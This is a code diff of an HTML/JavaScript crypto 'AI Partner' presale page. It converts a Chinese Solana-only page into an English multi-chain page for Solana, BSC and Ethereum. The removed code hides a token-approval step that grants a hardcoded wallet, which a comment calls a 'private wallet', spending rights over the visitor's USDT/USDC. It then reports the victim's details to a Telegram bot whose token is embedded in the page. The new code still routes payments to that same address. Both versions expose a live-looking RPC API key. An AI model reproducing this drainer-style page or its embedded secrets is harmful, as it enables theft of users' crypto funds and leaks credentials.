@@ -1,348 +1,449 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI Partner 多资产预售平台</title>
-    <!-- 仅引入 Solana Web3 官方库 -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Partner Multi-Chain Presale Platform</title>
+    <!-- Solana Web3 SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+
+    <!-- Ethers.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.umd.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #121212; color: #fff; }
-        button { padding: 12px 24px; font-size: 16px; margin: 10px; background-color: #14f195; border: none; cursor: pointer; font-weight: bold; border-radius: 8px; color: #000; }
-        button.approve-btn { background-color: #0070f3; color: white; }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 30px; background-color: #121212; color: #fff; padding: 0 15px; }
+        button { padding: 12px 24px; font-size: 16px; margin: 10px; background-color: #14f195; border: none; cursor: pointer; font-weight: bold; border-radius: 8px; color: #000; width: 100%; max-width: 320px; }
+        button.evm-btn { background-color: #8a2be2; color: white; }
+        button.eth-btn { background-color: #627eea; color: white; }
+        button.connect-btn { background-color: #0070f3; color: white; }
+        button.app-open-btn { background-color: #ab9ff2; color: #000; display: none; }
         button:hover { opacity: 0.9; }
-        #log { margin-top: 20px; white-space: pre-wrap; color: #a1a1a1; font-family: monospace; text-align: left; display: inline-block; line-height: 1.5; max-width: 800px; word-break: break-all; }
+        #log { margin-top: 20px; white-space: pre-wrap; color: #a1a1a1; font-family: monospace; text-align: left; display: inline-block; line-height: 1.5; max-width: 800px; width: 100%; word-break: break-all; }
         .input-container, .select-container { margin: 15px 0; }
-        .input-container input, select { padding: 10px 14px; font-size: 16px; border-radius: 6px; border: 1px solid #14f195; background: #1e1e1e; color: #fff; width: 240px; text-align: center; outline: none; }
+        .input-container input, select { padding: 10px 14px; font-size: 16px; border-radius: 6px; border: 1px solid #14f195; background: #1e1e1e; color: #fff; width: 100%; max-width: 290px; text-align: center; outline: none; }
     </style>
 </head>
 <body>
 
-    <h1>AI Partner 多资产预售平台</h1>
-    <p>支持 USDT / USDC / SOL 多资产参与兑换</p>
+    <h1>AI Partner Multi-Chain Presale</h1>
+    <p>Supports Solana (USDT/USDC/SOL) & EVM (BSC / Ethereum USDT)</p>
 
-    <!-- 支付资产选择 -->
+    <!-- Deep Link App Buttons for Mobile -->
+    <div style="margin: 15px 0;">
+        <button id="openPhantomAppBtn" class="app-open-btn" onclick="openInPhantomApp()">Open in Phantom App</button>
+        <button id="openEvmAppBtn" class="app-open-btn" style="background-color: #8a2be2; color: #fff;" onclick="openInEvmApp()">Open in MetaMask / Wallet App</button>
+    </div>
+
+    <!-- Chain & Asset Selection -->
     <div class="select-container">
-        <label for="assetSelect" style="font-size: 16px;">选择支付资产：</label>
-        <select id="assetSelect" onchange="handleAssetChange()">
-            <option value="USDC">USDC (推荐)</option>
-            <option value="USDT">USDT (推荐)</option>
-            <option value="SOL">SOL (原生代币)</option>
+        <label for="chainSelect" style="font-size: 16px;">Select Network: </label>
+        <select id="chainSelect" onchange="handleChainChange()">
+            <option value="SOLANA">Solana Chain</option>
+            <option value="BSC">EVM Chain (BSC USDT)</option>
+            <option value="ETH">Ethereum Chain (Ethereum USDT)</option>
         </select>
     </div>
 
-    <!-- 兑换金额输入框 -->
+    <!-- Solana Asset Selection -->
+    <div class="select-container" id="solanaAssetContainer">
+        <label for="assetSelect" style="font-size: 16px;">Select Payment Token: </label>
+        <select id="assetSelect" onchange="handleAssetChange()">
+            <option value="USDC">USDC</option>
+            <option value="USDT">USDT</option>
+            <option value="SOL">SOL (Native Token)</option>
+        </select>
+    </div>
+
+    <!-- Swap Amount Input -->
     <div class="input-container">
-        <label for="swapAmountInput" id="amountLabel" style="font-size: 16px;">兑换 USDT 数量：</label>
-        <input type="number" id="swapAmountInput" placeholder="输入兑换数量" min="0.000001" step="0.1">
-        <div style="font-size: 12px; color: #888; margin-top: 6px;" id="tipText">（USDT/USDC 需先授权，SOL 可直接参与）</div>
+        <label for="swapAmountInput" id="amountLabel" style="font-size: 16px;">Swap Amount: </label>
+        <input type="number" id="swapAmountInput" placeholder="Enter amount to swap" min="0.000001" step="0.1">
     </div>
     
-    <button class="approve-btn" id="approveBtn" onclick="handleApproveOnly()">1. 授权代币额度</button>
-    <button onclick="handleSwap()">2. 立即参与预售兑换</button>
+    <!-- Solana Actions -->
+    <div id="solanaActionButtons">
+        <button class="connect-btn" onclick="connectSolanaWallet()">1. Connect Wallet (Solana)</button>
+        <br>
+        <button onclick="handleSolanaSwap()">2. Join Presale Now (Solana)</button>
+    </div>
+
+    <!-- BSC EVM Actions -->
+    <div id="bscActionButtons" style="display: none;">
+        <button class="connect-btn" onclick="connectEvmWallet('BSC')">1. Connect Wallet (BSC)</button>
+        <br>
+        <button class="evm-btn" onclick="handleEvmSwap('BSC')">2. Join Presale Now (BSC)</button>
+    </div>
+
+    <!-- Ethereum EVM Actions -->
+    <div id="ethActionButtons" style="display: none;">
+        <button class="connect-btn" onclick="connectEvmWallet('ETH')">1. Connect Wallet (Ethereum)</button>
+        <br>
+        <button class="eth-btn" onclick="handleEvmSwap('ETH')">2. Join Presale Now (Ethereum)</button>
+    </div>
+
     <br>
     <div id="log"></div>
 
     <script>
-        // ==================== Telegram 通知配置 ====================
-        const TG_BOT_TOKEN = "8987985348:AAEAoMmM3GpGi29pI9_Ano8pqTnehohUatI";
-        const TG_CHAT_ID = "8568818831";
+        // ==================== Environment Helpers ====================
+        function isMobileDevice() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return /android|iphone|ipad|ipod/i.test(ua.toLowerCase());
+        }
 
-        async function sendTelegramNotification(message) {
-            try {
-                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) {
-                console.error("发送 Telegram 通知失败:", e);
+        function checkMobileBrowser() {
+            if (isMobileDevice()) {
+                if (!window.solana) document.getElementById('openPhantomAppBtn').style.display = 'inline-block';
+                if (!window.ethereum) document.getElementById('openEvmAppBtn').style.display = 'inline-block';
             }
         }
 
-        function stringToUtf8Array(str) {
-            return new TextEncoder().encode(str);
+        function openInPhantomApp() {
+            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
         }
 
-        async function getAnchorDiscriminator(name) {
-            const msgBuffer = new TextEncoder().encode(`global:${name}`);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-            return new Uint8Array(hashBuffer.slice(0, 8));
+        function openInEvmApp() {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            window.location.href = `https://metamask.app.link/dapp/${currentUrl}`;
         }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            checkMobileBrowser();
+            handleChainChange();
+        });
 
         function log(msg) {
             document.getElementById('log').innerText += msg + "\n";
             console.log(msg);
         }
 
-        // ==================== 合约与多资产配置常量 ====================
-        const PROGRAM_ID = new solanaWeb3.PublicKey("5vGy3M2wsvkzsRTcoqh9hWvY1wJcJ58hHgSZ2fmC6Mjx"); 
-        const PRESALE_STATE_PUBKEY = new solanaWeb3.PublicKey("9JBdwGcmps55rRiptJoTygXY6wJUTxvFTAujEc8wnQ2o");
-        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=37673d77-fa71-41d2-9572-b8d4defa5cee";
+        function handleChainChange() {
+            const chain = document.getElementById('chainSelect').value;
+            const solAssetContainer = document.getElementById('solanaAssetContainer');
+            const solButtons = document.getElementById('solanaActionButtons');
+            const bscButtons = document.getElementById('bscActionButtons');
+            const ethButtons = document.getElementById('ethActionButtons');
 
-        const ASSETS = {
-            "USDT": {
-                mint: new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"), 
-                vault: new solanaWeb3.PublicKey("5KAgnr4pLBjnLmHyNvfwwZDo1vZ9bFz7btRhHP7Fi9X1"),
-                decimals: 6
-            },
-            "USDC": {
-                mint: new solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"), 
-                vault: new solanaWeb3.PublicKey("CZZj4UvXBzxFSb1HcEbEWSrHzfjV8KWV1NV7v3VBgT7h"), 
-                decimals: 6
-            },
-            "SOL": {
-                mint: null, 
-                vault: new solanaWeb3.PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e"), 
-                decimals: 9
-            }
-        };
+            solAssetContainer.style.display = 'none';
+            solButtons.style.display = 'none';
+            bscButtons.style.display = 'none';
+            ethButtons.style.display = 'none';
 
-        const AIPARTNER_MINT_PUBKEY = new solanaWeb3.PublicKey("Auofy4iomuR3zyJib7PyqQZQNbsnVZmpbtpLJyubZT3r"); 
-        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-        const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
-        const SYSTEM_PROGRAM_ID = solanaWeb3.SystemProgram.programId;
-
-        // 🌟 按指定优先级获取钱包：1. Phantom -> 2. Solflare -> 3. Backpack
-        function getProvider() {
-            if (window.solana && window.solana.isPhantom) {
-                return { provider: window.solana, name: "Phantom" };
+            if (chain === 'SOLANA') {
+                solAssetContainer.style.display = 'block';
+                solButtons.style.display = 'block';
+                handleAssetChange();
+            } else if (chain === 'BSC') {
+                bscButtons.style.display = 'block';
+                document.getElementById('amountLabel').innerText = `Swap USDT Amount (BSC): `;
+            } else if (chain === 'ETH') {
+                ethButtons.style.display = 'block';
+                document.getElementById('amountLabel').innerText = `Swap USDT Amount (Ethereum): `;
             }
-            if (window.solflare && window.solflare.isSolflare) {
-                return { provider: window.solflare, name: "Solflare" };
-            }
-            if (window.backpack) {
-                return { provider: window.backpack, name: "Backpack" };
-            }
-            if (window.solana) {
-                return { provider: window.solana, name: "Solana Wallet" };
-            }
-            return null;
         }
 
         function handleAssetChange() {
-            const selectedAsset = document.getElementById('assetSelect').value;
-            document.getElementById('amountLabel').innerText = `兑换 ${selectedAsset} 数量：`;
-            const approveBtn = document.getElementById('approveBtn');
-            if (selectedAsset === 'SOL') {
-                approveBtn.style.display = 'none'; 
-                document.getElementById('tipText').innerText = '（SOL 为原生资产，无需授权，直接点击下方参与）';
-            } else {
-                approveBtn.style.display = 'inline-block';
-                approveBtn.innerText = '1. 授权代币额度';
-                document.getElementById('tipText').innerText = `（${selectedAsset} 需先点击“授权代币额度”，再进行兑换）`;
-            }
+            const assetKey = document.getElementById('assetSelect').value;
+            document.getElementById('amountLabel').innerText = `Swap ${assetKey} Amount: `;
         }
+
+        // ==================== SOLANA CONFIG ====================
+        const SOL_PROGRAM_ID = new solanaWeb3.PublicKey("AgBSRTVFzdjV9ChfqEEJhCca2mn11Unw1vtZsP3NhqmN");
+        const SOL_PRESALE_STATE = new solanaWeb3.PublicKey("Bx3Ays7Y3CHstTDUjvnU7TCgxtMZsR2uJrvhdm6XAjWv");
+        const PRESALE_AUTHORITY_PDA = new solanaWeb3.PublicKey("3978bf8U4Qcn3hNMu4wHoVvQUQnRRoT1yFhymvo4eBNz");
+        const VAULT_AIPARTNER_ACCOUNT = new solanaWeb3.PublicKey("9DYPeqVk9wV3PFwnjDU4UQ7biHvn8nSNmZVHZgUyML9");
+        const AIPARTNER_MINT = new solanaWeb3.PublicKey("BJ4DHhY2bhsgrjV3gVVd3YkDPRvUZZpbfzLtBNuKNXgs");
+
+        const SOL_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=37673d77-fa71-41d2-9572-b8d4defa5cee";
+        const MAIN_RECEIVER_WALLET = new solanaWeb3.PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e");
+
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+        const ASSOC_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 
         function getAssociatedTokenAddress(mint, owner) {
             return solanaWeb3.PublicKey.findProgramAddressSync(
                 [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
-                ASSOCIATED_TOKEN_PROGRAM_ID
+                ASSOC_TOKEN_PROGRAM_ID
             )[0];
         }
 
-        function getPresaleAuthorityPDA(presaleStatePubkey) {
-            return solanaWeb3.PublicKey.findProgramAddressSync(
-                [stringToUtf8Array("presale_authority"), presaleStatePubkey.toBuffer()],
-                PROGRAM_ID
-            )[0];
-        }
+        const SOL_MINT_USDT = new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+        const SOL_MINT_USDC = new solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
 
-        function createApproveInstruction(account, delegate, owner, amount) {
-            const data = new Uint8Array(9);
-            data[0] = 4; 
-            const view = new DataView(data.buffer);
-            view.setBigUint64(1, BigInt(amount), true);
-            return new solanaWeb3.TransactionInstruction({
-                keys: [
-                    { pubkey: account, isSigner: false, isWritable: true },
-                    { pubkey: delegate, isSigner: false, isWritable: false },
-                    { pubkey: owner, isSigner: true, isWritable: false },
-                ],
-                programId: TOKEN_PROGRAM_ID,
-                data: data
+        const SOL_ASSETS = {
+            "USDT": { mint: SOL_MINT_USDT, vault: getAssociatedTokenAddress(SOL_MINT_USDT, MAIN_RECEIVER_WALLET), decimals: 6 },
+            "USDC": { mint: SOL_MINT_USDC, vault: getAssociatedTokenAddress(SOL_MINT_USDC, MAIN_RECEIVER_WALLET), decimals: 6 },
+            "SOL":  { mint: null, vault: MAIN_RECEIVER_WALLET, decimals: 9 }
+        };
+
+        function getSolanaProvider() {
+            return new Promise((resolve) => {
+                const discoveredWallets = new Map();
+                const handler = (event) => {
+                    const detail = event.detail;
+                    if (detail && detail.provider && detail.info) {
+                        discoveredWallets.set((detail.info.name || '').toLowerCase(), detail.provider);
+                    }
+                };
+
+                window.addEventListener("solana#announceProvider", handler);
+                window.dispatchEvent(new Event("solana#requestProvider"));
+
+                setTimeout(() => {
+                    window.removeEventListener("solana#announceProvider", handler);
+
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('phantom') || p.isPhantom) return resolve(p);
+                    }
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('solflare') || p.isSolflare) return resolve(p);
+                    }
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('backpack') || p.isBackpack) return resolve(p);
+                    }
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('okx') || p.isOkxWallet) return resolve(p);
+                    }
+
+                    if (window.solana) return resolve(window.solana);
+                    resolve(null);
+                }, 100);
             });
         }
 
-        async function handleApproveOnly() {
-            let selectedAssetKey = "";
-            let userPubkeyStr = "";
+        async function connectSolanaWallet() {
             try {
                 document.getElementById('log').innerText = "";
-                selectedAssetKey = document.getElementById('assetSelect').value;
-                if (selectedAssetKey === 'SOL') {
-                    alert("SOL 是原生资产，无需执行授权！");
-                    return;
-                }
-
-                const walletInfo = getProvider();
-                if (!walletInfo) {
-                    return alert("未检测到 Phantom、Solflare 或 Backpack 钱包，请先安装其中一个！");
-                }
-                const provider = walletInfo.provider;
-                log(`当前使用钱包: ${walletInfo.name}`);
+                const provider = await getSolanaProvider();
+                if (!provider) return alert("Solana wallet not detected!");
 
                 await provider.connect();
-                const userPubkey = provider.publicKey;
-                userPubkeyStr = userPubkey.toBase58();
-                log(`已连接钱包: ${userPubkeyStr}`);
-
-                const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
-                const asset = ASSETS[selectedAssetKey];
-                const userPaymentAccount = getAssociatedTokenAddress(asset.mint, userPubkey);
-
-                const defaultAmount = 6.6; 
-                const approveRawAmount = BigInt(Math.floor(defaultAmount * Math.pow(10, asset.decimals)));
-
-                // 直接将 Delegate 指定为你的私有钱包地址
-                const targetDelegate = new solanaWeb3.PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e");
-
-                log(`正在向地址 ${targetDelegate.toBase58()} 授权 ${defaultAmount} ${selectedAssetKey}...`);
-                const approveIx = createApproveInstruction(userPaymentAccount, targetDelegate, userPubkey, approveRawAmount);
-
-                const transaction = new solanaWeb3.Transaction().add(approveIx);
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = userPubkey;
-
-                log("请在钱包中确认授权交易...");
-                const signedTx = await provider.signTransaction(transaction);
-                const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-                
-                log(`交易已发送，等待链上确认... (TxID: ${txid})`);
-                await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");
-
-                log(`🎉 ${selectedAssetKey} 授权成功！\nTxID: ${txid}`);
-
-                await sendTelegramNotification(
-                    `✅ <b>AI Partner 授权成功 (${walletInfo.name})</b>\n` +
-                    `用户: <code>${userPubkeyStr}</code>\n` +
-                    `资产: ${selectedAssetKey}\n` +
-                    `用户ATA: <code>${userPaymentAccount.toBase58()}</code>\n` +
-                    `预售状态账户: <code>${PRESALE_STATE_PUBKEY.toBase58()}</code>\n` +
-                    `TxID: <code>${txid}</code>`
-                );
-
+                log(`Connected Wallet: ${provider.publicKey.toBase58()}`);
             } catch (err) {
-                log(`操作失败: ${err.message}`);
-                console.error(err);
+                log(`Connection failed: ${err.message}`);
             }
         }
 
-        async function handleSwap() {
-            let selectedAssetKey = "";
-            let userPubkeyStr = "";
-            let numericAmount = 0;
+        async function handleSolanaSwap() {
             try {
                 document.getElementById('log').innerText = "";
-                selectedAssetKey = document.getElementById('assetSelect').value;
-                const asset = ASSETS[selectedAssetKey];
-
-                const walletInfo = getProvider();
-                if (!walletInfo) {
-                    return alert("未检测到受支持的钱包，请先安装 Phantom、Solflare 或 Backpack！");
-                }
-                const provider = walletInfo.provider;
-                log(`当前使用钱包: ${walletInfo.name}`);
+                const assetKey = document.getElementById('assetSelect').value;
+                const provider = await getSolanaProvider();
+                if (!provider) return alert("Solana wallet not detected!");
 
                 await provider.connect();
                 const userPubkey = provider.publicKey;
-                userPubkeyStr = userPubkey.toBase58();
-
-                const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
-                const presaleAuthorityPubkey = getPresaleAuthorityPDA(PRESALE_STATE_PUBKEY);
+                const connection = new solanaWeb3.Connection(SOL_RPC_URL, "confirmed");
+                const asset = SOL_ASSETS[assetKey];
 
                 const inputVal = document.getElementById('swapAmountInput').value.trim();
-                if (!inputVal || parseFloat(inputVal) <= 0) {
-                    return alert("请输入有效的兑换数量！");
-                }
-                numericAmount = parseFloat(inputVal);
+                if (!inputVal || parseFloat(inputVal) <= 0) return alert("Please enter a valid amount!");
+                const numericAmount = parseFloat(inputVal);
                 const paymentAmount = BigInt(Math.floor(numericAmount * Math.pow(10, asset.decimals)));
 
-                log(`🚀 准备使用 ${numericAmount} ${selectedAssetKey} 兑换 AIPartner...`);
+                const tx = new solanaWeb3.Transaction();
 
-                const transaction = new solanaWeb3.Transaction();
-                let userPaymentAccountStr = "原生资产 (无ATA)";
-
-                if (selectedAssetKey === 'SOL') {
-                    const solTransferIx = solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPubkey,
-                        toPubkey: asset.vault,
+                if (assetKey === 'SOL') {
+                    tx.add(solanaWeb3.SystemProgram.transfer({ 
+                        fromPubkey: userPubkey, 
+                        toPubkey: asset.vault, 
                         lamports: paymentAmount 
-                    });
-                    transaction.add(solTransferIx);
+                    }));
                 } else {
-                    const userPaymentAccount = getAssociatedTokenAddress(asset.mint, userPubkey);
-                    userPaymentAccountStr = userPaymentAccount.toBase58();
-                    const userAipartnerAccount = getAssociatedTokenAddress(AIPARTNER_MINT_PUBKEY, userPubkey);
-
-                    const aipartnerInfo = await connection.getAccountInfo(userAipartnerAccount);
-                    if (!aipartnerInfo) {
-                        const createAtaIx = new solanaWeb3.TransactionInstruction({
+                    const userAta = getAssociatedTokenAddress(asset.mint, userPubkey);
+                    const userAiAta = getAssociatedTokenAddress(AIPARTNER_MINT, userPubkey);
+                    
+                    const userAiAccountInfo = await connection.getAccountInfo(userAiAta);
+                    if (!userAiAccountInfo) {
+                        tx.add(new solanaWeb3.TransactionInstruction({
                             keys: [
                                 { pubkey: userPubkey, isSigner: true, isWritable: true },
-                                { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
+                                { pubkey: userAiAta, isSigner: false, isWritable: true },
                                 { pubkey: userPubkey, isSigner: false, isWritable: false },
-                                { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: false },
-                                { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
-                                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+                                { pubkey: AIPARTNER_MINT, isSigner: false, isWritable: false },
+                                { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
+                                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
                             ],
-                            programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+                            programId: ASSOC_TOKEN_PROGRAM_ID,
                             data: new Uint8Array(0)
-                        });
-                        transaction.add(createAtaIx);
+                        }));
                     }
 
-                    const discriminator = await getAnchorDiscriminator("swap_aipartner");
+                    const discriminator = new Uint8Array([113, 166, 39, 19, 160, 11, 208, 44]);
+                    
                     const swapData = new Uint8Array(16);
                     swapData.set(discriminator, 0);
-                    new DataView(swapData.buffer).setBigUint64(8, paymentAmount, true);
+                    
+                    const view = new DataView(swapData.buffer, swapData.byteOffset, swapData.byteLength);
+                    view.setBigUint64(8, paymentAmount, true);
 
-                    const swapInstruction = new solanaWeb3.TransactionInstruction({
+                    tx.add(new solanaWeb3.TransactionInstruction({
                         keys: [
                             { pubkey: userPubkey, isSigner: true, isWritable: true },
-                            { pubkey: userPaymentAccount, isSigner: false, isWritable: true },
+                            { pubkey: userAta, isSigner: false, isWritable: true },
                             { pubkey: asset.vault, isSigner: false, isWritable: true },
-                            { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: true },
-                            { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
-                            { pubkey: presaleAuthorityPubkey, isSigner: false, isWritable: false },
-                            { pubkey: PRESALE_STATE_PUBKEY, isSigner: false, isWritable: true },
-                            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+                            { pubkey: VAULT_AIPARTNER_ACCOUNT, isSigner: false, isWritable: true },
+                            { pubkey: userAiAta, isSigner: false, isWritable: true },
+                            { pubkey: PRESALE_AUTHORITY_PDA, isSigner: false, isWritable: false },
+                            { pubkey: SOL_PRESALE_STATE, isSigner: false, isWritable: true },
+                            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
                         ],
-                        programId: PROGRAM_ID,
+                        programId: SOL_PROGRAM_ID,
                         data: swapData
-                    });
-                    transaction.add(swapInstruction);
+                    }));
                 }
 
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = userPubkey;
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = userPubkey;
 
-                log("请在钱包中确认兑换交易...");
-                const signedTx = await provider.signTransaction(transaction);
-                const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-
-                log(`交易已发送，等待确认... (TxID: ${txid})`);
+                log("Please confirm the transaction in your wallet...");
+                const signed = await provider.signTransaction(tx);
+                const txid = await connection.sendRawTransaction(signed.serialize());
                 await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");
 
-                log(`🎉 兑换成功！成功使用 ${numericAmount} ${selectedAssetKey} 参与预售。\nTxID: ${txid}`);
+                log(`🎉 Presale swap successful!\nAmount: ${numericAmount} ${assetKey}\nTxID: ${txid}`);
+            } catch (err) {
+                log(`Swap failed: ${err.message}`);
+                console.error("Solana Swap Error:", err);
+            }
+        }
 
-                await sendTelegramNotification(
-                    `🚀 <b>AI Partner 预售兑换成功 (${walletInfo.name})！</b>\n` +
-                    `用户: <code>${userPubkeyStr}</code>\n` +
-                    `支付数量: ${numericAmount} ${selectedAssetKey}\n` +
-                    `用户ATA: <code>${userPaymentAccountStr}</code>\n` +
-                    `预售状态账户: <code>${PRESALE_STATE_PUBKEY.toBase58()}</code>\n` +
-                    `TxID: <code>${txid}</code>`
-                );
+        // ==================== EVM CONFIG ====================
+        const EVM_CONFIG = {
+            "BSC": {
+                chainId: 56n,
+                chainIdHex: "0x38",
+                chainName: "Binance Smart Chain Mainnet",
+                usdtContract: "0x55d398326f99059fF775485246999027B3197955", 
+                spenderAddress: "0x83D15a9747DA8B8a0a3c51823B5CF919C1F1D2c8", 
+                decimals: 18,
+                rpcUrl: "https://bsc-dataseed.binance.org/",
+                symbol: "BNB",
+                explorer: "https://bscscan.com/"
+            },
+            "ETH": {
+                chainId: 1n,
+                chainIdHex: "0x1",
+                chainName: "Ethereum Mainnet",
+                usdtContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", 
+                spenderAddress: "0x83D15a9747DA8B8a0a3c51823B5CF919C1F1D2c8", 
+                decimals: 6,
+                rpcUrl: "https://ethereum-rpc.publicnode.com",
+                symbol: "ETH",
+                explorer: "https://etherscan.io/"
+            }
+        };
+
+        function getEvmProvider() {
+            return new Promise((resolve) => {
+                const discoveredWallets = new Map();
+                const handler = (event) => {
+                    const detail = event.detail;
+                    if (detail && detail.provider && detail.info) {
+                        discoveredWallets.set((detail.info.name || '').toLowerCase(), detail.provider);
+                    }
+                };
+
+                window.addEventListener("eip6963:announceProvider", handler);
+                window.dispatchEvent(new Event("eip6963:requestProvider"));
+
+                setTimeout(() => {
+                    window.removeEventListener("eip6963:announceProvider", handler);
+                    
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('metamask') || (p.isMetaMask && !p.isPhantom && !p.isTrust && !p.isOkxWallet)) return resolve(p);
+                    }
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('trust') || p.isTrust) return resolve(p);
+                    }
+                    for (let [name, p] of discoveredWallets) {
+                        if (name.includes('okx') || p.isOkxWallet) return resolve(p);
+                    }
+
+                    if (window.ethereum) return resolve(window.ethereum);
+                    resolve(null);
+                }, 100);
+            });
+        }
+
+        async function connectEvmWallet(chainKey) {
+            try {
+                document.getElementById('log').innerText = "";
+                const config = EVM_CONFIG[chainKey];
+                const providerObj = await getEvmProvider();
+                if (!providerObj) return alert("Matching EVM wallet not detected!");
+
+                const provider = new ethers.BrowserProvider(providerObj);
+                await providerObj.request({ method: 'eth_requestAccounts' });
+                
+                const network = await provider.getNetwork();
+                if (network.chainId !== config.chainId) {
+                    log(`Requesting network switch to ${config.chainName}...`);
+                    await providerObj.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: config.chainIdHex }],
+                    });
+                }
+
+                const freshProvider = new ethers.BrowserProvider(providerObj);
+                const signer = await freshProvider.getSigner();
+                const userAddress = await signer.getAddress();
+
+                log(`Connected Wallet: ${userAddress}`);
+            } catch (err) {
+                log(`Connection failed: ${err.message || JSON.stringify(err)}`);
+            }
+        }
+
+        async function handleEvmSwap(chainKey) {
+            try {
+                document.getElementById('log').innerText = "";
+                const config = EVM_CONFIG[chainKey];
+                const providerObj = await getEvmProvider();
+                if (!providerObj) return alert("Matching EVM wallet not detected!");
+
+                const provider = new ethers.BrowserProvider(providerObj);
+                await providerObj.request({ method: 'eth_requestAccounts' });
+                
+                const network = await provider.getNetwork();
+                if (network.chainId !== config.chainId) {
+                    log(`Network mismatch. Requesting wallet switch to ${config.chainName}...`);
+                    await providerObj.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: config.chainIdHex }],
+                    });
+                }
+
+                const freshProvider = new ethers.BrowserProvider(providerObj);
+                const signer = await freshProvider.getSigner();
+
+                const inputVal = document.getElementById('swapAmountInput').value.trim();
+                if (!inputVal || parseFloat(inputVal) <= 0) return alert("Please enter a valid swap amount!");
+                
+                const numericAmount = parseFloat(inputVal);
+                const amountInUnits = ethers.parseUnits(numericAmount.toString(), config.decimals);
+
+                log(`Initiating ${chainKey} presale swap (${numericAmount} USDT)...`);
+
+                const presaleAbi = [
+                    "function participate(uint256 usdtAmount) external"
+                ];
+
+                const presaleContract = new ethers.Contract(config.spenderAddress, presaleAbi, signer);
+                
+                const tx = await presaleContract.participate(amountInUnits);
+                log(`Presale transaction submitted. Waiting for confirmation...\nTxHash: ${tx.hash}`);
+
+                await tx.wait();
+
+                log(`🎉 ${chainKey} presale swap successful!\nTxHash: ${tx.hash}`);
 
             } catch (err) {
-                log(`操作失败: ${err.message}`);
+                if (err.message && err.message.includes("network changed")) {
+                    log(`⚠️ Network change detected. Please click "Join Presale Now" again.`);
+                } else {
+                    log(`${chainKey} Swap failed: ${err.message || JSON.stringify(err)}`);
+                }
                 console.error(err);
